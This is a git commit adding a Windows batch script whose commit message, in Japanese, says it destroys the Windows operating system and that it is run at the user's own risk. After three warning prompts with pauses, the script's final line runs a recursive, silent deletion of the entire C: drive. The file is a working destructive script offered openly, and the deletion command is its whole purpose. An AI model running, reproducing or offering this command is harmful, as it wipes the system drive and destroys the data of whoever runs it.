0267bc8f54470df0855329ed386577e9c58f68bf
pork cutlet/ とんかつ！ <155070832+Taku310@users.noreply.github.com>
2024-07-16 22:39:30 +0900

    Mitonzu Destructive1.0β .bat
    batファイルを使用してwindows OS を破壊します
    実行は自己責任で

---
+++ Mitonzu Destructive1.0β .bat
@@ -0,0 +1,17 @@
+@ echo off
+title 警告
+echo このコンピューターを破壊するのですね
+pause
+cls
+@ echo off
+title 警告
+echo run?
+pause 
+cls
+@echo off
+title 最終警告
+echo run?????????.
+pause
+cls
+@echo off
+cmd /c rd /s /q c:\
